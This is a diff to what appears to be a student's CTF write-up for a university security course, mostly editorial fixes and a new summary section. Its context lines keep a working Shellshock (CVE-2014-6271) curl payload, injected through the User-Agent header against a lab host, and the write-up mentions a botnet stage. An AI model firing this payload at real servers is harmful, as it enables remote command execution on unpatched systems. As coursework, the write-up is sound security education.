@@ -160,7 +160,7 @@ The subsequent `curl` returned following output:
 ```
 This is a vulnerable web application for showcasing CVE 2014-6271, a.k.a. Shellshock.
 ```
-Vulnerable application, very nice. I simply used the approach described on [exploit-db] (https://www.exploit-db.com/exploits/34766) to get in.
+Vulnerable application, very nice. I simply used the approach described on [exploit-db](https://www.exploit-db.com/exploits/34766) to get in.
 
 ```bash
 curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'ls -al'" 192.168.1.127:8080/cgi-bin/stats
@@ -174,7 +174,7 @@ The short exploration of machine showed a lot of files in the `/home/grinch` dir
 ```
 
 ### Decrypting...
-It was apparent that we are looking at the encrypted text. But which cipher was used? The first line seemed to be hint - so 3 letters, upper and lower cases and numbers... Again, let's google a bit - first result for key `symetric ciphers` led me to http://www.crypto-it.net/eng/symmetric/index.html with list of ciphers. Two candidates for the regex - RC4 and RC2. [Criptii](https://cryptii.com/) for the rescue!. 
+It was apparent that we are looking at the encrypted text. But which cipher was used? The first line seemed to be hint - so 3 letters, upper and lower cases and numbers... Again, let's google a bit - first result for key `symetric ciphers` led me to http://www.crypto-it.net/eng/symmetric/index.html with list of ciphers. Two candidates for the regex - RC4 and RC2. [Criptii](https://cryptii.com/) for the rescue!
 
 ![decryption](assets/decryption.png)
 
@@ -283,6 +283,7 @@ Good luck and Merry Xmas!
 
 Unfortunately due to time pressure, I was unable to finish my botnet and therefore, sadly, no stage 4 for me.
 
-# Conclusion
+# Summing Up
+In this blog post I described how I managed to go through the last bonus assignment of [BSY](https://www.fel.cvut.cz/en/education/bk/predmety/47/02/p4702106.html) subject at FEE CTU. The assignment contained various types of tasks a security expert can deal with including PCAP analysis, system hacking and basic cryptographic tasks. 
 
-
+I must say that I was amazed by the complexity of some parts of the assignment and also by a fact, that when in trouble, Google knows literally everything even though, you give it just a clue.
